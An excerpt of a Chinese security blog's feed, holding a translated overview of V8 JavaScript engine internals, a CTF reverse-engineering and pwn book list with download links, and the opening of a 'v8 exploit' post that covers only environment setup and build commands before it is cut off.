    <content type="html"><![CDATA[<h2 id="What-is-V8"><a href="#What-is-V8" class="headerlink" title="What is V8?"></a>What is V8?</h2><p>v8是Google的Javascript引擎，它被采用作为Google Chrome/Node.js的Javascript引擎。</p><h2 id="Execution-flow"><a href="#Execution-flow" class="headerlink" title="Execution flow"></a>Execution flow</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-132557.png" alt=""></p><h2 id="Parsing"><a href="#Parsing" class="headerlink" title="Parsing"></a>Parsing</h2><h3 id="Basic-parsing"><a href="#Basic-parsing" class="headerlink" title="Basic parsing"></a>Basic parsing</h3><p>v8解析源代码并将其转换为AST抽象语法树<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-133048.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-133133.png" alt=""></p><h3 id="Split-parsing-phase"><a href="#Split-parsing-phase" class="headerlink" title="Split parsing phase"></a>Split parsing phase</h3><p>首先，直接解析所有的代码并不是很好，如果解析的代码没有被执行，这是没有意义的。<br>为了延迟解析，将parse分为两个阶段。</p><h4 id="PreParsing"><a href="#PreParsing" class="headerlink" title="PreParsing"></a>PreParsing</h4><p>事先解析所有函数的布局。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-133801.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-134324.png" alt=""><br>v8::internal::PreParser Class一次解析函数的轮廓。<br>由此得到</p><ul><li>初步的语法错误检查</li><li>函数的范围生成<h4 id="Lazy-Parsing"><a href="#Lazy-Parsing" class="headerlink" title="Lazy Parsing"></a>Lazy Parsing</h4>v8仅在调用延迟解析的函数时才进行解析。<br>更多的可参考：</li><li><a href="https://docs.google.com/presentation/d/1b-ALt6W01nIxutFVFmXMOyd_6ou_6qqP6S0Prmb1iDs/present?%20slide=id.p&amp;slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1b-ALt6W01nIxutFVFmXMOyd_6ou_6qqP6S0Prmb1iDs/present?%20slide=id.p&amp;slide=id.p</a></li><li><a href="https://www.youtube.com/watch?v=Fg7niTmNNLg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Fg7niTmNNLg</a></li></ul><h2 id="Abstract-Syntax-Tree"><a href="#Abstract-Syntax-Tree" class="headerlink" title="Abstract Syntax Tree"></a>Abstract Syntax Tree</h2><p>V8自己实现的解析器，不使用编译器编译器，如yacc或lex。使用递归下降语法分析进行解析。</p><h3 id="Subsclass-constructor-return"><a href="#Subsclass-constructor-return" class="headerlink" title="Subsclass constructor return"></a>Subsclass constructor return</h3><p>修改继承类中的构造函数<br>在派生类的构造函数中返回表达式<br>转换为三元运算符<br>如果表达式的结果未定义，则返回该值。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-140018.png" alt=""></p><h3 id="for-let-const-var-in-of-e"><a href="#for-let-const-var-in-of-e" class="headerlink" title="for(let/const/var in/of e)"></a>for(let/const/var in/of e)</h3><p>为了在for-in/of的初始化中使用const/let<br>通过将其封闭在一个块中，来声明一个变量<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-141224.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-141230.png" alt=""></p><h3 id="Spread-operator"><a href="#Spread-operator" class="headerlink" title="Spread operator"></a>Spread operator</h3><p>在JavaScript的语法中，有一个名为Spread运算符的语法。<br>var x = [1，2，3];<br>var y = [… x];<br>V8会将此语法重写为完全不同的语法，如Altus的Transpiler。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-141136.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-141208.png" alt=""><br>通过这种方式，我们将其重写为等效的do和for of语法</p><h3 id="Ecmascript-–-Binary-AST"><a href="#Ecmascript-–-Binary-AST" class="headerlink" title="Ecmascript? – Binary AST"></a>Ecmascript? – Binary AST</h3><p>正如我们所看到的，AST的大小非常大，所以我们建议压缩它。</p><h2 id="Ignition"><a href="#Ignition" class="headerlink" title="Ignition"></a>Ignition</h2><h3 id="Bytecode-Interpreter"><a href="#Bytecode-Interpreter" class="headerlink" title="Bytecode Interpreter"></a>Bytecode Interpreter</h3><p>v8在执行之前将生成的AST转换成1到4字节的bytecode</p><h3 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h3><p>Ignition是一种基于寄存器的字节码解释器，它实际上将值分配给CPU的寄存器，并执行它们。<br>在Ignition中，预先生成一个名为BytecodeHandler的字节码处理函数，从字节码中获得一个数组索引。<br>将生成的汇编代码分配给该索引，一个接一个地调用Bytecode数组，调用相应索引的汇编程序并执行代码。</p><h3 id="Pseudo-javascript-code"><a href="#Pseudo-javascript-code" class="headerlink" title="Pseudo javascript code"></a>Pseudo javascript code</h3><p>用Javascript来模拟这个结构，看起来像这样。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-144250.png" alt=""></p><h3 id="How-to-create-bytecode"><a href="#How-to-create-bytecode" class="headerlink" title="How to create bytecode?"></a>How to create bytecode?</h3><p>V8准备一个称为v8::internal::AstVisitor<subclass>的基类，简称AstVisitor，从AST生成bytecode。<br>AstVisitor是一个使用Vistor模式的类。<br>在深度优先搜索AST时调用相应的回调函数。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-141853.png" alt=""></subclass></p><h3 id="BytecodeArray"><a href="#BytecodeArray" class="headerlink" title="BytecodeArray"></a>BytecodeArray</h3><p>生成的bytecode存储在BytecodeArray中。<br>BytecodeArray在函数基础上存在。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-145533.png" alt=""></p><h3 id="InterpreterEntryTrampoline"><a href="#InterpreterEntryTrampoline" class="headerlink" title="InterpreterEntryTrampoline"></a>InterpreterEntryTrampoline</h3><p>最终生成的字节码是从被称为InterpreterEntryTrampoline的Builtin代码执行的。<br>InterpreterEntryTrampoline被编译成Assembly，并且被当成普通的C函数调用。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-150607.png" alt=""></p><h3 id="Ignition-Handler"><a href="#Ignition-Handler" class="headerlink" title="Ignition Handler"></a>Ignition Handler</h3><p>前面伪代码中显示的BytecodeHandlers是V8<br>它被称为Ignition Handler<br>DSL中描述的Ignition Handler被称为CodeStubAssembler</p><h2 id="Code-Generator"><a href="#Code-Generator" class="headerlink" title="Code Generator"></a>Code Generator</h2><p>v8中有几个汇编生成点，如下</p><ul><li>CodeStub</li><li>Builtins</li><li>Runtime</li><li>BytecodeHandler<br>我明白是从Bytecode运行汇编程序，但是相应的汇编程序如何从Bytecode生成？什么是BytecodeHandler?</li></ul><h2 id="CodeStubAssember"><a href="#CodeStubAssember" class="headerlink" title="CodeStubAssember"></a>CodeStubAssember</h2><h3 id="What-is-CodeStubAssmber"><a href="#What-is-CodeStubAssmber" class="headerlink" title="What is CodeStubAssmber?"></a>What is CodeStubAssmber?</h3><p>CodeStubAssembler(CSA)将抽象代码生成为v8内部的graph generation DSL。<br>CodeGenerator只需组装预定的执行节点，即可为每个架构生成代码，因此您不必每次都编写汇编代码。</p><h3 id="Graph-based-DSL"><a href="#Graph-based-DSL" class="headerlink" title="Graph based DSL"></a>Graph based DSL</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-180848.png" alt=""><br>这个代码可以创建一个Graph,在执行时去使用它生成汇编。<br>Graph是使用DSL语言实现的，与c++代码的实际流程不同。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-143547.png" alt=""></p><p>由于使用了CodeStubAssembler，即使您不熟悉实际体系结构的汇编程序，也可以轻松的添加新代码。<br>而且可读性也非常高。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-181353.png" alt=""></p><h3 id="Assembler"><a href="#Assembler" class="headerlink" title="Assembler"></a>Assembler</h3><p>让我们来看看为每个架构实际输出代码的x64的jmp助记符<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-181738.png" alt=""></p><h3 id="Where-is-actually-outputting-the-assembler-in-Code-Generation"><a href="#Where-is-actually-outputting-the-assembler-in-Code-Generation" class="headerlink" title="Where is actually outputting the assembler in Code Generation"></a>Where is actually outputting the assembler in Code Generation</h3><p>名为MacroAssembler的类扮演着其角色。<br>虽然MacroAssembler的接口与体系结构无关，但在其内部调用的Assembler类会输出特定于每个体系结构的代码。<br>在V8中，MacroAssembler经常以属性名称masm频繁出现<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-144042.png" alt=""><br>最后，GraphResolver遍历Graph，通过MacroAssembler调用Assembler并输出汇编程序。</p><p>但是，MacroAssembler是进行最终的代码输出，底层抽象opcode嵌入在Graph中。<br>通过下面的层次结构，生成一个architecture-specific Graph。</p><ul><li>CodeStubAssembler</li><li>CodeAssembler</li><li>RawMachineAssembler</li><li>MachineOperatorBuilder<br>你越往下走，就越具体。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-144522.png" alt=""></li></ul><h3 id="Where-to-use"><a href="#Where-to-use" class="headerlink" title="Where to use"></a>Where to use</h3><p>Builtins使用Assembler class为不同架构生成Stub<br>一些部分使用CSA（*.gen.cc)<br>几乎所有的ignition handlers在CSA中有描述。</p><h2 id="Builtins-amp-Runtime"><a href="#Builtins-amp-Runtime" class="headerlink" title="Builtins &amp; Runtime"></a>Builtins &amp; Runtime</h2><h3 id="Builtins"><a href="#Builtins" class="headerlink" title="Builtins"></a>Builtins</h3><p>Builtins是在v8启动时被编译好的asm code fragment<br>Call Builtin就像call一个函数<br>也被称为Stub<br>没有进行runtime优化</p><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p>Runtime是可以从Builtins和其他汇编代码中调用的c++代码<br>连接javascript和c++<br>也没有runtime优化</p><h2 id="Inline-Caching"><a href="#Inline-Caching" class="headerlink" title="Inline Caching"></a>Inline Caching</h2><h3 id="What-is-Inline-Caching"><a href="#What-is-Inline-Caching" class="headerlink" title="What is Inline Caching"></a>What is Inline Caching</h3><p>缓存之前的访问去加速property访问速度<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-145001.png" alt=""></p><ul><li>第一次访问<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-145015.png" alt=""></li><li>第二次以后的访问<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-145029.png" alt=""><h3 id="Search-Property"><a href="#Search-Property" class="headerlink" title="Search Property"></a>Search Property</h3><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-145221.png" alt=""><br>为了从对象中找到property<br>从HashMap或者FixedArray加载属性<br>但每次都很慢<h3 id="Reduce-Property-Access"><a href="#Reduce-Property-Access" class="headerlink" title="Reduce Property Access"></a>Reduce Property Access</h3>在这个例子中，对具有相同Map的对象多次执行对y的访问。<br>由于obj已经知道Map(x,y)…<br>当然我们也知道内存布局，所以通过直接指定偏移量来访问会更快。<h3 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h3>所以存储特定map的访问<br>当访问你一个property的时候，Map object被记录<br>这样做之后，第二次和随后的property访问被加速<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-192301.png" alt=""><h3 id="Cache-Miss"><a href="#Cache-Miss" class="headerlink" title="Cache Miss"></a>Cache Miss</h3>但是当Map更改的时候，自然会发生Cache miss，因此需要重新加载该属性并在此记住它。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-150302.png" alt=""><br>Load IC-Miss and StoreIC_Miss被调用，或者通过C++ runtime得到对象的属性。</li></ul><h3 id="Cahce-State"><a href="#Cahce-State" class="headerlink" title="Cahce State"></a>Cahce State</h3><p>Cahce State状态转变如下：<br>PreMonomorphic<br>Monomorphic<br>Polymorphic<br>Megamorphic<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191809.png" alt=""></p><h4 id="Pre-Monomorphic"><a href="#Pre-Monomorphic" class="headerlink" title="Pre Monomorphic"></a>Pre Monomorphic</h4><p>Uninitialized state-&gt;搜寻所用的隐藏类，以及获取位移。（参考上图第一次访问）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191437.png" alt=""></p><h4 id="Monomorphic"><a href="#Monomorphic" class="headerlink" title="Monomorphic"></a>Monomorphic</h4><p>Monomorphic是Receiver的类型不变时的IC，即这是在只访问single Map的理想情况<br>在这种情况下，一个缓存就足够了，所以它将是最快的情况。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191514.png" alt=""></p><h4 id="Polymorphic"><a href="#Polymorphic" class="headerlink" title="Polymorphic"></a>Polymorphic</h4><p>Polymorphic是在两种或更多类型的Receiver类型存在时被设置。<br>由于Polymorphic是循环搜索缓存的Map，找到应该使用的那个，所以它比Monomorphic慢，但比没有IC快得多。<br><strong>（Map存储在FixedArray中，从多个Map搜索并执行属性访问的缓存）</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191552.png" alt=""></p><h4 id="Megamorphic"><a href="#Megamorphic" class="headerlink" title="Megamorphic"></a>Megamorphic</h4><p>由于Miss太多，停止进行Map记录的状态。<br>通过从Stub调用GetProperty，来从哈希表中搜索，是获取properties最慢的状态。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-191842.png" alt=""></p><h3 id="Access-inherited-properties"><a href="#Access-inherited-properties" class="headerlink" title="Access inherited properties"></a>Access inherited properties</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192442.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192512.png" alt=""></p><h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-192553.png" alt=""></p><h2 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h2><h3 id="Hot-or-Small"><a href="#Hot-or-Small" class="headerlink" title="Hot or Small"></a>Hot or Small</h3><p>对满足以下条件的代码优化<br>（function字节码长度/1200）+ function被调用2次<br>函数很小（字节码长度小于90）</p><h3 id="Optimization-Budget"><a href="#Optimization-Budget" class="headerlink" title="Optimization Budget"></a>Optimization Budget</h3><p>Optimization Budget(优化预算）在字节码执行期间被分配给每个函数，当其值低于0时，成为候选优化代码。</p><h3 id="For-loop"><a href="#For-loop" class="headerlink" title="For loop"></a>For loop</h3><p>优化For循环<br>在循环中，输出称为JumpLoop的字节码<br>通过这个JumpLoop，返回终点的地址的值的偏移量被加权<br>从之前的Budget(预算)中扣除一个值，当它变成0的时候，对loop的优化将发生。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-063748.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-064529.png" alt=""></p><h3 id="OSR-OnStackReplacement"><a href="#OSR-OnStackReplacement" class="headerlink" title="OSR - OnStackReplacement"></a>OSR - OnStackReplacement</h3><p>在代码被编译和从bytecode到machine language之后，jump终点被改变，循环代码被切换到优化编译好的机器码。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-183524.png" alt=""></p><h3 id="For-function"><a href="#For-function" class="headerlink" title="For function"></a>For function</h3><p>在函数调用的情况下，计算被Ignition生成的Return Bytecode在BytecodeHandler中的调用次数，如果超过一个阈值，就执行中断，并编译bytecode，替换原来的函数体。<br><strong>（如果是函数，会生成一个Return bytecode,在此处中断并进行budget检查）</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-184051.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065216.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065239.png" alt=""></p><h3 id="Concurrent-Compilation"><a href="#Concurrent-Compilation" class="headerlink" title="Concurrent Compilation"></a>Concurrent Compilation</h3><p>并行编译在对函数进行优化时是异步完成的，因此它不一定会针对后续函数调用进行优化<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065540.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065647.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-065711.png" alt=""></p><h3 id="Budget-for-function"><a href="#Budget-for-function" class="headerlink" title="Budget for function"></a>Budget for function</h3><p>即使loop被分割，整个预算也会被计算出来，即使是Return也是如此，所以优化没有问题。</p><h2 id="TurboFan"><a href="#TurboFan" class="headerlink" title="TurboFan"></a>TurboFan</h2><h3 id="What-is-TurboFan"><a href="#What-is-TurboFan" class="headerlink" title="What is TurboFan?"></a>What is TurboFan?</h3><p>TurboFan是V8的编译优化组件<br>在V8中，当bytecode的优化编译发生，它生成一个IR<br>TurboFan进行Graph generation和优化<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-071141.png" alt=""></p><h3 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h3><p>抽象执行块<br>Control Flow Graph<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-071419.png" alt=""></p><h3 id="Optimization-1"><a href="#Optimization-1" class="headerlink" title="Optimization"></a>Optimization</h3><p>TurboFan优化graph</p><ul><li>inline<br>内联函数调用</li><li>trimming<br>未到达节点删除</li><li>type<br>类型推断</li><li>typed-lowering<br>根据类型将表达式和指令替换为更简单的处理</li><li>loop-peeling<br>取出循环内的处理。</li><li>loop-exit-elimination<br>删除Loop Exit</li><li>load-elimination<br>删除不必要的读取和检查</li><li>simplified-lowering<br>用更具体的值来进行指令的简单转换</li><li>generic-lowering<br>将JS前缀指令转换为更简单的调用和stub调用</li><li>dead-code-elimination<br>删除无法访问的代码</li></ul><h3 id="Code-generation"><a href="#Code-generation" class="headerlink" title="Code generation"></a>Code generation</h3><p>最终，Class InstructionSelector分配寄存器<br>根据Graph，CodeGenerator生成机器码<br>将汇编代码写入PC（ProgramCounter）</p><h2 id="Deoptimization"><a href="#Deoptimization" class="headerlink" title="Deoptimization"></a>Deoptimization</h2><h3 id="What-is-Deoptimization"><a href="#What-is-Deoptimization" class="headerlink" title="What is Deoptimization?"></a>What is Deoptimization?</h3><p>Deoptimization在有意料之外的值被传递到优化后的Assembly code时，对函数重新进行编译。<br>让我们看一个Deoptimization发生的例子</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-080927.png" alt=""></p><h3 id="Wrong-Map"><a href="#Wrong-Map" class="headerlink" title="Wrong Map"></a>Wrong Map</h3><p>在这个例子中，我们为第一个Map{(x)}输出一个优化的Assembly，<br>但是由于第二次调用的是{(x，y)}Map，因此它被强制重新编译<br>让我们看一下汇编<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-081254.png" alt=""></p><h3 id="Bailout"><a href="#Bailout" class="headerlink" title="Bailout"></a>Bailout</h3><p>检查map是否正确<br>当Deoptimization完成后，代码返回到字节码执行</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-17-184155.png" alt=""><br>以上是V8执行JS的过程<br>为了节省，省略了GC<br>（下载的pdf不能复制粘贴，大部分翻译是谷歌翻译相机拍下来然后识别翻译的，我尽量把我能理解的部分都纠正了）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;What-is-V8&quot;&gt;&lt;a href=&quot;#What-is-V8&quot; class=&quot;headerlink&quot; title=&quot;What is V8?&quot;&gt;&lt;/a&gt;What is V8?&lt;/h2&gt;&lt;p&gt;v8是Google的Javascript引擎，它被采用作为Google 
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>ctf re/pwn入门书单</title>
    <link href="http://eternalsakura13.com/2018/05/31/shudan/"/>
    <id>http://eternalsakura13.com/2018/05/31/shudan/</id>
    <published>2018-05-30T16:42:24.801Z</published>
    <updated>2018-06-01T14:44:50.322Z</updated>
    
    <content type="html"><![CDATA[<p>因为之前经常有人问我入门看什么书……就写一下吧。</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="c-反汇编技术解密"><a href="#c-反汇编技术解密" class="headerlink" title="c++反汇编技术解密"></a>c++反汇编技术解密</h3><p>链接:<a href="https://pan.baidu.com/s/1d-XqvHTU85K88aDwMNBl5w" target="_blank" rel="noopener">https://pan.baidu.com/s/1d-XqvHTU85K88aDwMNBl5w</a>  密码:k0aa<br>介绍：这本是完整看完了的，后面关于对象和类写的不错。</p><h3 id="使用OllyDbg从零开始Cracking-已完结）"><a href="#使用OllyDbg从零开始Cracking-已完结）" class="headerlink" title="使用OllyDbg从零开始Cracking(已完结）"></a>使用OllyDbg从零开始Cracking(已完结）</h3><p>链接:<a href="https://pan.baidu.com/s/1ntwXQYX" target="_blank" rel="noopener">https://pan.baidu.com/s/1ntwXQYX</a><br>解压密码:pediy<br>介绍：学习od使用的教程，动手实践上不错，翻译和配套资料在看雪可以搜到。</p><h3 id="逆向工程权威指南"><a href="#逆向工程权威指南" class="headerlink" title="逆向工程权威指南"></a>逆向工程权威指南</h3><p><a href="https://beginners.re/" target="_blank" rel="noopener">https://beginners.re/</a><br>链接:<a href="https://pan.baidu.com/s/1BtJEsqE2e_DHFlzJWrJw2g" target="_blank" rel="noopener">https://pan.baidu.com/s/1BtJEsqE2e_DHFlzJWrJw2g</a>  密码:wenn</p><h2 id="pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf-pwn看过的书）"><a href="#pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf-pwn看过的书）" class="headerlink" title="pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf pwn看过的书）"></a>pwn（浏览器、内核什么的书就不安利了……太多了，只写一下学ctf pwn看过的书）</h2><h3 id="0day安全2"><a href="#0day安全2" class="headerlink" title="0day安全2"></a>0day安全2</h3><p>链接:<a href="https://pan.baidu.com/s/1LITCWADikf7bBUskZiFHAA" target="_blank" rel="noopener">https://pan.baidu.com/s/1LITCWADikf7bBUskZiFHAA</a>  密码:0zgo<br>介绍：我只看了前半本的内容，书有点老了，感觉看不看没影响。</p><h3 id="深入理解计算机系统"><a href="#深入理解计算机系统" class="headerlink" title="深入理解计算机系统"></a>深入理解计算机系统</h3><p>链接:<a href="https://pan.baidu.com/s/1gtB8fEUUtFj8blwJnajICQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1gtB8fEUUtFj8blwJnajICQ</a>  密码:yx0s<br>介绍：必读书，读了大概一个周，不求全懂，大概用到的地方都看过了，其他的用到再查了，其实内容也不是很深。</p><h3 id="程序员的自我修养"><a href="#程序员的自我修养" class="headerlink" title="程序员的自我修养"></a>程序员的自我修养</h3><p>链接:<a href="https://pan.baidu.com/s/1cALpx_D_9CR9hWWM9rIMwQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1cALpx_D_9CR9hWWM9rIMwQ</a>  密码:73pe<br>介绍: 必读的基础书，讲Linux上的程序装载链接什么的，很有意义。</p><h3 id="glibc内存管理ptmalloc源代码分析"><a href="#glibc内存管理ptmalloc源代码分析" class="headerlink" title="glibc内存管理ptmalloc源代码分析"></a>glibc内存管理ptmalloc源代码分析</h3><p>链接:<a href="https://pan.baidu.com/s/1-0odrFdV0Dn7xgehicuz0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1-0odrFdV0Dn7xgehicuz0A</a>  密码:su8n<br>介绍：理解Linux堆管理的必读书</p><h3 id="漏洞战争"><a href="#漏洞战争" class="headerlink" title="漏洞战争"></a>漏洞战争</h3><p>链接:<a href="https://pan.baidu.com/s/1Myfox3OWTHWqeW8n82NI4w" target="_blank" rel="noopener">https://pan.baidu.com/s/1Myfox3OWTHWqeW8n82NI4w</a>  密码:r8i0<br>介绍：很好的书，里面的案例能调的都值得调一下。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>书的话入门看看就好，也没必要从头看到尾，用到的内容记住，其他的知道在哪查就好（反正仔细看完也会忘干净的，指自己）<br>一般一本几百页的书，最多看一个周就看完了，如果我只需要看其中一部分可能更快。<br>大部分学习用到的东西都是谷歌搜索，看PPT和博客，这部分就不补充了（因为太多了）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为之前经常有人问我入门看什么书……就写一下吧。&lt;/p&gt;
&lt;h2 id=&quot;逆向&quot;&gt;&lt;a href=&quot;#逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向&quot;&gt;&lt;/a&gt;逆向&lt;/h2&gt;&lt;h3 id=&quot;c-反汇编技术解密&quot;&gt;&lt;a href=&quot;#c-反汇编技术解密&quot; c
      
    
    </summary>
    
      <category term="读书笔记" scheme="http://eternalsakura13.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="入门书单" scheme="http://eternalsakura13.com/tags/%E5%85%A5%E9%97%A8%E4%B9%A6%E5%8D%95/"/>
    
  </entry>
  
  <entry>
    <title>v8 exploit</title>
    <link href="http://eternalsakura13.com/2018/05/06/v8/"/>
    <id>http://eternalsakura13.com/2018/05/06/v8/</id>
    <published>2018-05-06T14:10:30.872Z</published>
    <updated>2018-07-06T03:18:38.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="v8的知识结构"><a href="#v8的知识结构" class="headerlink" title="v8的知识结构"></a>v8的知识结构</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h3><ol><li><p>各种依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver</span><br></pre></td></tr></table></figure></li><li><p>gdb-peda</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/scwuaptx/peda.git ~/peda</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure></li><li><p>环境设置<br>ubuntu16.04 x64<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-06-142104.png" alt=""></p></li></ol><h3 id="使用make的方式去编译v8（2016年当时）"><a href="#使用make的方式去编译v8（2016年当时）" class="headerlink" title="使用make的方式去编译v8（2016年当时）"></a>使用make的方式去编译v8（2016年当时）</h3><ol><li><p>depot_tools准备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>v8编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8$ git reset --hard 6ff5881b1def45b35384572f61327e42563a89c3</span><br><span class="line">$ gclient sync</span><br><span class="line">$ make x64.debug -j 8 # 如果这一步出现问题，就按照下面的方式重新编译</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$ mv ./third_party/binutils/Linux_x64/Release/bin/ld.gold&#123;,.old&#125;</span><br><span class="line">$ ln -s &#123;/usr,./third_party/binutils/Linux_x64/Release&#125;/bin/ld.gold</span><br><span class="line">$ make x64.debug -j 8</span><br><span class="line"></span><br><span class="line"># instead of using symbloic link, you can use the following line (thank ishita for helping</span><br><span class="line">$ GYP_DEFINES=&quot;werror= linux_use_bundled_binutils=0 linux_use_bundled_gold=0&quot; make x64.debug -j8</span><br></pre></td></tr></table></figure></li></ol><p><strong>/path/to/根据你自己的环境替换。</strong></p><ol><li>启动<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./out/x64.debug/d8</span><br><span class="line">$ ./out/x64.debug/shell</span><br></pre></td></tr></table></figure></li></ol><h3 id="使用ninja的方式去编译v8（2018现在）"><a href="#使用ninja的方式去编译v8（2018现在）" class="headerlink" title="使用ninja的方式去编译v8（2018现在）"></a>使用ninja的方式去编译v8（2018现在）</h3><ol><li>depot_tools准备<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li></ol><p><strong>/path/to/根据你自己的环境替换。</strong></p><ol><li><p>ninja准备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/ninja-build/ninja.git</span><br><span class="line">$ cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">$ echo &apos;export PATH=$PATH:&quot;/path/to/ninja&quot;&apos; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>v8编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; 